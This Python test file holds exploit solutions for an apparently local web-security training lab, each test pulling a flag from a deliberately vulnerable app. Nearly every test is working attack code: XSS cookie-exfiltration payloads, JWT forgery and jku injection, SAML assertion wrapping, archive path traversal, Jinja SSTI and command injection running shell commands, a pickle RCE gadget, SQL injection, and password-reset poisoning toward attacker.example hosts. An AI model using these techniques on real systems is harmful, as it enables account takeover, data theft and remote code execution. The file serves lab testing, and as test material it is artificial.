"""Exploit tests for the Phase 3 catalog wave."""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import json
import pickle
import re
import subprocess
import tarfile
import time

import httpx

from conftest import flag_payload


def test_xss_csp_nonce_bypass(lab):
    c = lab["client"]
    nonce = c.get("/").text.split("nonce-", 1)[1].split("'", 1)[0]
    payload = f"alert(1);</script><script nonce={nonce}>fetch('/collect?c='+document.cookie)</script>"
    r = c.get("/api/sinks", params={"callback": payload})
    assert "fetch('/collect?c='" in r.text
    assert "script-src 'nonce-" in r.headers.get("content-security-policy", "")
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_xss_dom_clobber(lab):
    c = lab["client"]
    payload = (
        '<img src=x onerror=alert(1)>'
        '<form id="config" data-endpoint="/submit?data=x"></form>'
        '<input name="__proto__" data-ref="x">'
    )
    r = c.get("/preview", params={"note": payload})
    assert payload in r.text
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_client_prototype_pollution(lab):
    c = lab["client"]
    assert flag_payload(lab) not in c.get("/api/render").text
    r = c.post("/api/prefs", json={"__proto__": {"priceMultiplier": 0.0001}})
    assert r.status_code == 200, r.text
    assert "0.0001" in c.get("/api/render").text
    assert flag_payload(lab) in c.get("/api/render").text


def test_client_clickjacking_frame(lab):
    c = lab["client"]
    headers = c.get("/headers")
    assert headers.status_code == 200
    content = headers.text.lower()
    assert "frame-ancestors" not in content
    assert "x-frame-options" not in content or "deny" not in content
    assert "<iframe" in c.get("/attack").text.lower()
    assert flag_payload(lab) in c.get("/auto-confirm").text


def test_api_graphql_field_auth(lab):
    c = lab["client"]
    schema = c.post("/graphql", json={"query": '{ __type(name: "Finance") { name fields { name } } }'})
    assert "flag" in schema.text
    r = c.post("/graphql", json={"query": '{ user(id: "2") { id name role finance { balance flag } } }'})
    assert flag_payload(lab) in r.text


def test_upload_archive_traversal(lab):
    c = lab["client"]
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        info = tarfile.TarInfo("../../templates/import-report.html")
        payload = b"{{ flag }}"
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    r = c.post("/import", files={"bundle": ("bundle.tar", buffer.getvalue(), "application/x-tar")})
    assert r.status_code == 200, r.text[-400:]
    assert flag_payload(lab) in c.get("/report").text


def test_upload_content_type_confusion(lab):
    c = lab["client"]
    body = b"<html><body><script>fetch('/session').then(r=>r.json()).then(d=>fetch('/collect?c='+encodeURIComponent(d.flag)))</script></body></html>"
    r = c.post("/", files={"avatar": ("poc.svg", body, "image/svg+xml")})
    assert r.status_code == 200, r.text[-400:]
    stored = r.text.split("Avatar stored as", 1)[1].split("/media/", 1)[1].split('"', 1)[0]
    served = c.get(f"/media/{stored}")
    assert "text/html" in served.headers.get("content-type", "")
    assert b"<script>" in served.content
    assert flag_payload(lab) in c.get("/session").text


def test_upload_polyglot_image(lab):
    c = lab["client"]
    payload = (
        b'GIF89a;\n<html><body><script>fetch("/session").then(r=>r.json()).then(d=>fetch("/collect?c="+encodeURIComponent(d.flag)))</script></body></html>'
    )
    r = c.post("/", files={"photo": ("poly.gif", payload, "image/gif")})
    assert r.status_code == 200, r.text[-400:]
    stored = r.text.split("/gallery/", 1)[1].split('"', 1)[0]
    served = c.get(f"/gallery/{stored}")
    assert served.content.startswith(b"GIF89a")
    assert b"<script>" in served.content
    assert flag_payload(lab) in c.get("/session").text


def test_xss_csp_jsonp(lab):
    c = lab["client"]
    assert "script-src" in c.get("/").headers.get("content-security-policy", "")
    inject = '<script src="/api/jsonp?callback=window.name"></script>'
    c.post("/post", data={"body": inject})
    assert inject in c.get("/").text
    assert c.get("/api/jsonp", params={"callback": "window.name"}).text.startswith("window.name(")
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_auth_jwt_jku_injection(lab):
    c = lab["client"]
    guest = c.get("/login", params={"username": "guest"})
    assert guest.status_code == 200
    headers = {"Cookie": f"hl_token={c.cookies.get('hl_token')}"}
    assert c.get("/admin", headers=headers).status_code == 403
    key = lab["state"] / "attacker-private.pem"
    pub = lab["state"] / "attacker-public.pem"
    subprocess.run(
        ["openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", str(key)],
        check=True,
        capture_output=True,
    )
    subprocess.run(["openssl", "rsa", "-in", str(key), "-pubout", "-out", str(pub)], check=True, capture_output=True)
    modulus = subprocess.run(
        ["openssl", "rsa", "-in", str(key), "-modulus", "-noout"], check=True, capture_output=True, text=True
    ).stdout.strip().split("=", 1)[1]
    n = base64.urlsafe_b64encode(bytes.fromhex(modulus)).rstrip(b"=").decode()
    keyset = {"keys": [{"kty": "RSA", "kid": "attacker-1", "use": "sig", "alg": "RS256", "n": n, "e": "AQAB"}]}
    (lab["state"] / "attacker-keyset.json").write_text(json.dumps(keyset))

    def b64(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    header = b64(
        json.dumps(
            {"alg": "RS256", "typ": "JWT", "kid": "attacker-1", "jku": f"http://127.0.0.1:{lab['port']}/attacker/jwks"},
            separators=(",", ":"),
        ).encode()
    )
    body = b64(json.dumps({"sub": "guest", "role": "admin"}, separators=(",", ":")).encode())
    signature = subprocess.run(
        ["openssl", "dgst", "-sha256", "-sign", str(key)],
        input=f"{header}.{body}".encode(),
        capture_output=True,
        check=True,
    ).stdout
    r = c.get("/admin", headers={"Cookie": f"hl_token={header}.{body}.{b64(signature)}"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_machine_saas_admin_console(lab):
    c = lab["client"]
    import html as html_module

    assert "/onboarding/" in c.get("/robots.txt").text
    preview = c.get("/onboarding/preview.html").text
    login = c.post("/login", data={"username": "support.ops@orbit.internal", "password": "0rb1t-Staff!2025"})
    assert login.status_code == 200, login.text[-300:]
    assert flag_payload(lab, "user") in c.get("/console").text

    secret = html_module.unescape(preview.split("jwtSecret", 1)[1].split(":", 1)[1].split(",")[0]).strip().strip("\"' ")

    def b64(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64(
        json.dumps(
            {"sub": "support.ops@orbit.internal", "email": "support.ops@orbit.internal", "role": "admin", "iss": "orbit-console"},
            separators=(",", ":"),
        ).encode()
    )
    sig = b64(hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest())
    forged = {"orbit_session": f"{header}.{body}.{sig}"}
    c.cookies.clear()
    export = c.get("/api/admin/tenants/export", headers={"Cookie": f"orbit_session={forged['orbit_session']}"})
    assert export.status_code == 200, export.text[-300:]
    assert flag_payload(lab, "api") in export.text

    forged_header = {"Cookie": f"orbit_session={forged['orbit_session']}"}
    diag = c.post("/console/admin/diagnostics", data={"url": f"http://127.0.0.1:{lab['port']}/internal/worker/info"}, headers=forged_header)
    assert "/internal/worker/shell" in diag.text
    shell = c.post(
        "/console/admin/diagnostics",
        data={"url": f"http://127.0.0.1:{lab['port']}/internal/worker/shell", "probe": "127.0.0.1; cat /tmp/orbit-root.txt"},
        headers=forged_header,
    )
    assert flag_payload(lab, "root") in shell.text


def test_machine_hr_onboarding(lab):
    c = lab["client"]
    assert "/share/" in c.get("/robots.txt").text
    login = c.post("/login", data={"username": "nadia.okafor@atlas-people.example", "password": "Atlas!Onboard26"})
    assert login.status_code == 200, login.text[-300:]
    assert flag_payload(lab, "user") in c.get("/dashboard").text
    assert c.get("/documents/payslip/4").status_code == 200
    c.post("/profile", data={"full_name": "Nadia Okafor", "department": "Sales", "title": "Sales Manager", "role": "hr_admin"})
    assert flag_payload(lab, "api") in c.get("/dashboard").text
    converter = c.post("/admin/converter", data={"file": "onboarding.pdf; cat /tmp/atlas-hr-root.txt"})
    assert flag_payload(lab, "root") in converter.text

def test_logic_coupon_race(lab):
    c = lab["client"]
    from concurrent.futures import ThreadPoolExecutor

    def hit(_index: int) -> int:
        try:
            return lab["client"].post("/api/coupons/redeem", data={"code": "FOUNDER40"}).status_code
        except httpx.HTTPError:
            return 0

    for _ in range(3):
        with ThreadPoolExecutor(max_workers=20) as pool:
            list(pool.map(hit, range(20)))
        if flag_payload(lab) in c.get("/vault").text:
            return
    raise AssertionError("coupon race never reached the founder vault")


def test_logic_signup_bonus_loop(lab):
    c = lab["client"]
    for _ in range(9):
        assert c.get("/api/welcome").status_code == 200
    assert flag_payload(lab) in c.post("/store/buy", data={"item": "founder-pass"}).text


def test_logic_approval_self(lab):
    c = lab["client"]
    c.post("/login", data={"username": "opfern", "password": "Op!Desk2026"})
    c.post("/requests", data={"amount": "420"})
    r = c.post("/requests/1/approve")
    assert flag_payload(lab) in r.text


def test_logic_cart_quantity_rounding(lab):
    c = lab["client"]
    c.post("/cart/add", data={"sku": "flag-pass", "qty": "1"})
    c.post("/cart/add", data={"sku": "desk", "qty": "-4"})
    receipt = c.post("/checkout")
    assert flag_payload(lab) in receipt.text


def test_logic_invite_reuse(lab):
    c = lab["client"]
    assert "ATR-ADMIN-7X9Q" in c.get("/invite/list").text
    r = c.post(
        "/register",
        data={"token": "ATR-ADMIN-7X9Q", "email": "intruder@example.net", "username": "intruder", "password": "intruder-pass-2026"},
    )
    assert r.status_code == 200
    assert flag_payload(lab) in c.get("/welcome").text



# ---------------------------------------------------------------------------
# Groups C and G
# ---------------------------------------------------------------------------

def test_auth_password_reset_poison(lab):
    c = lab["client"]
    c.post("/login", data={"username": "garin", "password": "scooter-2026"})
    account = c.get("/account").text
    rows = re.findall(
        r"<li>([^<·]+)·\s*<span class=\"dim\">([^<]+)</span> ·\s*<code>([^<]+)</code> · ([^<]+)</li>",
        account,
    )
    admin = next((row for row in rows if row[3].strip() == "admin"), None)
    assert admin, account[-600:]
    c.post(
        "/forgot",
        data={"email": "garin@velocity.local", "user_id": admin[2]},
        headers={"X-Forwarded-Host": "attacker.example"},
    )
    mail = c.get("/mail").text
    assert "attacker.example" in mail
    token = re.search(r"/reset\?token=([A-Za-z0-9_-]+)", mail).group(1)
    c.get("/reset", params={"token": token})
    c.post("/reset", data={"token": token, "password": "NewVictimPass!2026", "password2": "NewVictimPass!2026"})
    assert flag_payload(lab) in c.get("/account").text


def test_auth_mfa_bypass_response(lab):
    c = lab["client"]
    c.post("/login", data={"username": "ops", "password": "0perations!2026"})
    assert c.cookies.get("mfa") == "required"
    headers = {"Cookie": f"mfa=complete; challenge={c.cookies.get('challenge')}"}
    c.get("/dashboard", headers=headers)
    assert flag_payload(lab) in c.get("/dashboard").text


def test_auth_sso_assertion_replay(lab):
    import html as html_module

    c = lab["client"]
    response = c.post("/idp/login", data={"username": "renner", "password": "renner-demo-2026"})
    assert response.status_code in (200, 302)
    section = response.text.split("Base64 (SAMLResponse)", 1)
    assert len(section) == 2
    assertion = html_module.unescape(section[1].split("<pre>", 1)[1].split("</pre>", 1)[0])
    xml = base64.b64decode(assertion).decode()
    signed = re.search(r"<(?:\w+:)?Assertion\b[^>]*>.*?</(?:\w+:)?Assertion>", xml, re.S).group(0)
    forged = (
        '<ns0:Assertion xmlns:ns0="urn:helios:crm:assertion:1.0" ID="_unsigned">'
        "<ns0:Subject><ns0:NameID>attacker@evil.local</ns0:NameID></ns0:Subject>"
        '<ns0:Attribute name="email"><ns0:Value>attacker@evil.local</ns0:Value></ns0:Attribute>'
        '<ns0:Attribute name="role"><ns0:Value>admin</ns0:Value></ns0:Attribute>'
        '<ns0:Attribute name="username"><ns0:Value>renner</ns0:Value></ns0:Attribute>'
        "</ns0:Assertion>"
    )
    wrapped = xml.replace(signed, forged + signed, 1)
    payload = base64.b64encode(wrapped.encode()).decode()
    r = c.post("/sso/acs", data={"SAMLResponse": payload})
    assert r.status_code in (200, 302)
    assert flag_payload(lab) in c.get("/portal").text


def test_access_http_parameter_pollution(lab):
    c = lab["client"]
    c.post("/login", data={"username": "devon", "password": "devon-treasury-2026"})
    c.post("/role", params={"role": "treasury"}, data={"role": "admin"})
    assert flag_payload(lab) in c.get("/console").text


def test_access_trust_proxy_header(lab):
    c = lab["client"]
    c.post("/login", data={"username": "mei", "password": "mei-sre-2026"})
    assert "Internal access" not in c.get("/admin").text
    r = c.get("/admin", headers={"X-Forwarded-For": "10.0.0.7"})
    assert flag_payload(lab) in r.text


def test_chain_open_redirect_to_token_theft(lab):
    c = lab["client"]
    c.post("/clients", data={"client_id": "wayfinder-web", "redirect_uri": f"http://127.0.0.1:{lab['port']}/attacker"})
    assert "attacker" in c.get("/authorize").text
    r = c.post("/authorize", data={"username": "operator", "password": "Waypoint-2026!"})
    match = re.search(r"code=([A-Za-z0-9_-]+)", r.text) or re.search(r"code=([A-Za-z0-9_-]+)", r.headers.get("location", ""))
    assert match
    callback = c.get("/callback", params={"code": match.group(1)})
    token = re.search(r"access_token=([A-Za-z0-9_.-]+)", callback.text)
    assert token, callback.text[-400:]
    c.post("/beacon", data={"referrer": f"{callback.url}#access_token={token.group(1)}"})
    leaked = re.search(r"wp_[A-Za-z0-9_-]+", c.get("/logs").text)
    assert leaked
    assert flag_payload(lab) in c.get("/capture", params={"token": leaked.group(0)}).text


def test_chain_lfi_to_rce(lab):
    c = lab["client"]
    assert c.get("/docs", params={"page": "../logs/access.log"}).status_code == 200
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-chain-lfi-to-rce.txt').read() }}"
    c.get("/insights/visitors", headers={"User-Agent": payload})
    r = c.get("/preview", params={"template": "../workspace/logs/access.log"})
    assert flag_payload(lab) in r.text


def test_chain_xss_to_csrf_admin(lab):
    c = lab["client"]
    payload = "<img src=x onerror=fetch('/collect?c='+encodeURIComponent(document.cookie))>"
    c.post("/comments", data={"article": "lantern-1", "body": payload})
    assert payload in c.get("/article/lantern-1").text
    bot = lab["state"] / "bot-session.txt"
    headers = {}
    if bot.exists():
        headers["Cookie"] = f"admin_session={bot.read_text().strip()}"
        headers["Origin"] = "http://attacker.invalid"
    r = c.post("/admin/promote", data={"username": "guest", "role": "admin"}, headers=headers)
    if flag_payload(lab) not in r.text and "Cookie" in headers:
        r = c.get("/admin", headers=headers)
    assert flag_payload(lab) in r.text


def test_chain_jwt_to_sqli(lab):
    c = lab["client"]
    c.post("/login", data={"username": "agent", "password": "Orchard-2026!"})
    header, body, signature = c.cookies.get("orchard_token").split(".")
    secret = None
    for word in c.get("/static/wordlist.txt").text.split():
        digest = base64.urlsafe_b64encode(
            hmac.new(word.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        if digest == signature:
            secret = word
            break
    assert secret, "weak JWT secret not in the published wordlist"
    b64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()  # noqa: E731
    new_header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    claims = {
        "sub": "x' UNION SELECT username, password, 0, role FROM staff-- ",
        "role": "admin",
        "exp": int(time.time()) + 3600,
    }
    new_body = b64(json.dumps(claims, separators=(",", ":")).encode())
    new_sig = b64(hmac.new(secret.encode(), f"{new_header}.{new_body}".encode(), hashlib.sha256).digest())
    forged = {"Cookie": f"orchard_token={new_header}.{new_body}.{new_sig}"}
    assert c.get("/api/notes", headers=forged).status_code == 200
    assert flag_payload(lab) in c.get("/notes", headers=forged).text


def test_chain_ssti_to_flask_config(lab):
    from flask.sessions import SecureCookieSessionInterface

    c = lab["client"]
    c.post("/login", data={"username": "operator", "password": "Terraform-2026!"})
    assert c.get("/admin").status_code == 403
    page = c.get("/", params={"name": "{{config['SECRET_KEY']}}"}).text
    marker = page.split("Rendered</h2>", 1)[1].split("</p>", 1)[0] if "Rendered</h2>" in page else page
    secret = re.search(r"terraform-[A-Za-z0-9_-]{20,}", marker)
    assert secret, page[-500:]

    class Shim:
        secret_key = secret.group(0)
        config = {"SECRET_KEY_FALLBACKS": []}

    cookie = SecureCookieSessionInterface().get_signing_serializer(Shim()).dumps(
        {"user": "operator", "role": "admin", "is_admin": True}
    )
    assert flag_payload(lab) in c.get("/admin", headers={"Cookie": f"tf_session={cookie}"}).text



# ---------------------------------------------------------------------------
# Group F
# ---------------------------------------------------------------------------

def test_adv_http_host_header_reset(lab):
    c = lab["client"]
    c.get("/cache/reset")
    c.get("/home", params={"tenant": "attacker.evil"}, headers={"X-Edge-Suffix": "example"})
    served = c.get("/home")
    assert served.headers.get("x-cache") == "HIT"
    assert "attacker.evil.example" in served.text

    login = c.post("/login", data={"email": "analyst@mistral-id.example"}, headers={"X-Edge-Suffix": "attacker.evil"})
    index = login.text.find("reset/confirm?t=")
    assert index != -1 and "attacker" in login.text[max(0, index - 120):index]

    victim = {"identity_token": flag_payload(lab)}
    c.get("/sso/start", headers={"X-Edge-Suffix": "attacker.evil"}, cookies=victim)
    approve = c.post(
        "/sso/authorize",
        data={"redirect_uri": "http://attacker.evil/dashboard", "ticket": "t1"},
        cookies=victim,
        follow_redirects=False,
    )
    assert "identity_token=" in approve.headers.get("location", "")
    assert flag_payload(lab) in c.get("/me", cookies=victim).text


def test_adv_csrf_token_reuse(lab):
    c = lab["client"]
    c.post("/login", data={"email": "quinn@acme.test", "password": "harbor-2026"})
    leaked = c.get("/preview").text.split('id="ft">', 1)[1].split("<", 1)[0]
    attacker = httpx.Client(base_url=lab["base"], follow_redirects=True, timeout=10)
    try:
        attacker.post("/login", data={"email": "mallory@evil.test", "password": "harbor-2026"})
        response = attacker.post(
            "/change-email",
            data={"csrf": leaked, "email": f"{flag_payload(lab)}@evil.test"},
            headers={"Origin": "http://attacker.invalid"},
        )
        assert "changed" in str(response.url)
        assert flag_payload(lab) in attacker.get("/api/session").text
    finally:
        attacker.close()


def test_adv_cache_key_normalization(lab):
    c = lab["client"]
    c.get("/cache/reset")
    payload = f"<script>fetch('/collect?c={flag_payload(lab)}')</script>"
    first = c.get("/page", params={"lang": payload})
    assert first.headers.get("x-cache") == "MISS"
    cached = c.get("/page")
    assert cached.headers.get("x-cache") == "HIT"
    assert payload in cached.text
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_client_websocket_csrf(lab):
    c = lab["client"]
    c.post("/login", data={"user": "ops-lead", "password": "console-2026"})
    cookie = f"pilot_tab={c.cookies.get('pilot_tab')}"
    r = c.post("/ws/send", json={"action": "vault.read"}, headers={"Cookie": cookie, "Origin": "http://attacker.invalid"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_api_batch_endpoint_auth(lab):
    c = lab["client"]
    token = c.post("/api/token", json={"name": "demo"}).json()["token"]
    auth = {"Authorization": f"Bearer {token}"}
    assert c.get("/api/admin/export", headers=auth).status_code == 403
    r = c.post("/api/batch", headers=auth, json={"operations": [{"op": "invoices.list"}, {"op": "admin.export"}]})
    assert r.status_code in (200, 207), r.text[-400:]
    assert flag_payload(lab) in r.text



def test_server_ssti_jinja_sandbox(lab):
    c = lab["client"]
    assert "49" in c.get("/preview", params={"body": "{{7*7}}"}).text
    probe = c.get("/preview", params={"body": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"})
    assert "uid=" in probe.text
    response = c.get(
        "/preview",
        params={"body": "{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-jinja-sandbox.txt').read() }}"},
    )
    assert flag_payload(lab) in response.text


def test_server_deserialization_pickle(lab):
    c = lab["client"]
    assert c.post("/login", data={"username": "ops", "password": "shiplog-2026"}).status_code in (200, 302)
    page = c.get("/").text
    assert "SL-8841" in page
    assert "customs release" in page
    key = re.search(r"sample key[^:]*: ([\w-]+)", c.get("/docs/session-format.txt").text).group(1)

    class Gadget:
        """Builtins-only pickle gadget: resolves inside any lab module name."""

        def __reduce__(self):
            return (
                subprocess.check_output,
                (["cat", "/tmp/redvault-server-deserialization-pickle.txt"],),
            )

    blob = pickle.dumps(
        {"user": "ops", "role": "admin", "shipments": [], "notices": [Gadget()]},
        protocol=4,
    )
    signature = hmac.new(key.encode(), blob, hashlib.sha256).hexdigest()
    cookie = signature + "." + base64.urlsafe_b64encode(blob).decode()
    response = c.get("/", headers={"Cookie": f"shiplog_state={cookie}"})
    assert flag_payload(lab) in response.text
